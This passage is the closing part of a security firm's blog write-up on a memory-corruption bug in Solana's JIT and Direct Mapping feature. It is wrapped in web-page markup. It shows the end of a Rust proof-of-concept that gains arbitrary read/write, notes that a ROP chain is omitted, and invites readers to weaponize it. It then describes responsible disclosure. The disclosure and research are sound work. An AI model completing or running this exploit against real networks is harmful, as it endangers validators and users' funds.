token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement771\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--75\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[75]}],\"\\n\",[\"$\",\"span\",\"line-number--76\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[76]}],[\"$\",\"span\",\"code-segement775\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement776\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// At this point, arb_ptr (accounts[pointer_idx]) points to arbitrary memory.\"]}],[\"$\",\"span\",\"code-segement777\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--77\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[77]}],[\"$\",\"span\",\"code-segement779\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement780\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// ROP chain setup would occur here (omitted).\"]}],[\"$\",\"span\",\"code-segement781\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--78\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[78]}],\"\\n\",[\"$\",\"span\",\"line-number--79\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[79]}],[\"$\",\"span\",\"code-segement785\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement786\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}],[\"$\",\"span\",\"code-segement787\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement788\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement789\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement790\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement791\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement792\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement793\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement794\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--80\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[80]}],[\"$\",\"span\",\"code-segement796\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement797\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement798\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--81\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[81]}],\"\\n\",[\"$\",\"span\",\"line-number--82\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[82]}],[\"$\",\"span\",\"code-segement802\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement803\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Move to next potential MemoryRegion structure\"]}],[\"$\",\"span\",\"code-segement804\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--83\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[83]}],[\"$\",\"span\",\"code-segement806\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                data_ptr \"]}],[\"$\",\"span\",\"code-segement807\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+=\"]}],[\"$\",\"span\",\"code-segement808\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement809\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement810\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement811\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement812\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement813\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement814\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement815\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement816\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x08\"]}],[\"$\",\"span\",\"code-segement817\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement818\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement819\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement820\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement821\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement822\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement823\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement824\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement825\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement826\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement827\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement828\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement829\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"4\"]}],[\"$\",\"span\",\"code-segement830\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement831\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement832\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement833\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement834\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"4\"]}],[\"$\",\"span\",\"code-segement835\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement836\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--84\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[84]}],[\"$\",\"span\",\"code-segement838\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement839\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement840\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--85\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[85]}],[\"$\",\"span\",\"code-segement842\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement843\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement844\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--86\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[86]}],\"\\n\",[\"$\",\"span\",\"line-number--87\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[87]}],[\"$\",\"span\",\"code-segement848\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement849\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Note: computation budget exhaustion may be necessary in real-world scenarios\"]}],[\"$\",\"span\",\"code-segement850\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--88\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[88]}],[\"$\",\"span\",\"code-segement852\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement853\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement854\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--89\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[89]}],\"\\n\",[\"$\",\"span\",\"line-number--90\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[90]}],[\"$\",\"span\",\"code-segement858\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement859\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement860\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement861\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement862\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement863\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement864\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--91\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[91]}],[\"$\",\"span\",\"code-segement866\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement867\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement868\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--92\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[92]}],\"\"]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-127\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"After successfully getting arbitrary read/write, remote code execution (RCE) would be achievable using traditional binary exploitation tricks.\"}],\"\\n\",[\"$\",\"div\",\"div-0\",{\"className\":\"relative w-full pb-[56.25%]\",\"children\":[\"\\n  \",[\"$\",\"iframe\",\"iframe-0\",{\"className\":\"absolute top-0 left-0 w-full h-full\",\"src\":\"https://www.youtube.com/embed/qlnRNFnFaXM?si=9nCPqBPqxjFJQHHb\",\"title\":\"YouTube video player\",\"allow\":\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-128\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Notably, the PoCs shown here is no where near stable enough to launch an attack against an active Solana network. Specifically, we haven't implemented account spraying, and also used hardcoded offsets for calculating thread stack and ROPgadgets. However, there are well-established approaches in weaponizing such PoCs into exploits, and we leave this as an exercise for interested readers.\"}],\"\\n\",[\"$\",\"h2\",\"h2-10\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"Final Thoughts\"}],\"\\n\",[\"$\",\"p\",\"p-129\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"As demonstrated, even memory-safe languages like Rust can harbor subtle and powerful vulnerabilities, especially in complex systems utilizing unsafe code to push the boundaries of performance and optimization. \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"What began as a curiosity about Solana’s JIT and memory model evolved into a critical finding that could have compromised the integrity of the entire network.\"}]]}],\"\\n\",[\"$\",\"p\",\"p-130\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"During our disclosure of the bug to Solana, the team was highly responsive, and also fast to understand the concepts discussed in the report. They also made significant decisions such as putting the Direct Mapping feature on hold for further scrutiny, instead of hastily launching it to meet deadlines. While bugs are inevitable, Solana's professional handling of bug disclosures shows their commitment to security, and demonstrates why it deserves to be a top tier project.\"}],\"\\n\",[\"$\",\"p\",\"p-131\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"We had a lot of fun exploring this bug. Reading through code, understanding system design at a deep level, and crafting a non-obvious exploit path. These are the kinds of challenges we live for. Hopefully, this write-up sheds light on how the bug hunting process really works. It is not just about the final exploit, but about the twists, dead ends, and intuition that lead there. We hope you enjoyed reading it as much as we enjoyed the journey.\"}],\"\\n\",[\"$\",\"p\",\"p-132\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"At Anatomist Security, we specialize in uncovering such vulnerabilities through deep technical research and rigorous security audits. If you're building complex software, especially in fast-moving areas like blockchain, and want to ensure its robustness, reach out. We'd love to help.\"}],[\"$\",\"style\",\"style-0\",{\"children\":\"$14\"}]]]}]}],[\"$\",\"div\",null,{\"className\":\"absolute inset-x-0 top-[calc(100%-13rem)] -z-10 transform-gpu overflow-hidden blur-3xl sm:top-[calc(100%-30rem)]\",\"aria-hidden\":\"true\",\"children\":[\"$\",\"div\",null,{\"className\":\"relative left-[calc(50%+3rem)] aspect-[1155/678] w-[36.125rem] -translate-x-1/2 bg-gradient-to-tr from-accent3 to-primary opacity-30 sm:left-[calc(50%+36rem)] sm:w-[72.1875rem]\",\"style\":{\"clipPath\":\"polygon(74.1% 44.1%, 100% 61.6%, 97.5% 26.9%, 85.5% 0.1%, 80.7% 2%, 72.5% 32.5%, 60.2% 62.4%, 52.4% 68.1%, 47.5% 58.3%, 45.2% 34.5%, 27.5% 76.7%, 0.1% 64.9%, 17.9% 100%, 27.6% 76.8%, 76.1% 97.7%, 74.1% 44.1%)\"}}]}]]}],[\"$\",\"$L15\",null,{}]]\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n8:null\n"])</script><script>self.__next_f.push([1,"11:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Anatomist Security – Web3 / Blockchain Audit Experts\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Seasoned security researchers providing deep‑dive smart‑contract \u0026 blockchain infrastructure audits, fuzzing and consulting.\"}],[\"$\",\"meta\",\"2\",{\"name\":\"keywords\",\"content\":\"smart contract audit,blockchain security,web3,eth,solidity,vyper,solana,audit,pentest\"}],[\"$\",\"link\",\"3\",{\"rel\":\"canonical\",\"href\":\"https://anatomi.st/blog/2025_06_27_pwning_solana_for_fun_and_profit\"}],[\"$\",\"meta\",\"4\",{\"property\":\"og:title\",\"content\":\"Anatomist Security – Web3 Audit Experts\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:description\",\"content\":\"Battle‑tested researchers securing billions in on‑chain value.\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:url\",\"content\":\"https://anatomi.st\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Anatomist Security\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:locale\",\"content\":\"en_US\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:image\",\"content\":\"https://anatomi.st/og-cover.png\"}],[\"$\",\"meta\",\"10\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:site\",\"content\":\"@th3anatomist\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:creator\",\"content\":\"@th3anatomist\"}],[\"$\",\"meta\",\"14\",{\"name\":\"twitter:title\",\"content\":\"Anatomist Security – Web3 Audit Experts\"}],[\"$\",\"meta\",\"15\",{\"name\":\"twitter:description\",\"content\":\"Battle‑tested researchers securing billions in on‑chain value.\"}],[\"$\",\"meta\",\"16\",{\"name\":\"twitter:image\",\"content\":\"https://anatomi.st/og-cover.png\"}],[\"$\",\"link\",\"17\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"32x32\"}],[\"$\",\"link\",\"18\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\"}]],\"error\":null,\"digest\":\"$undefined\"}\nb:{\"metadata\":\"$11:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script></body></html>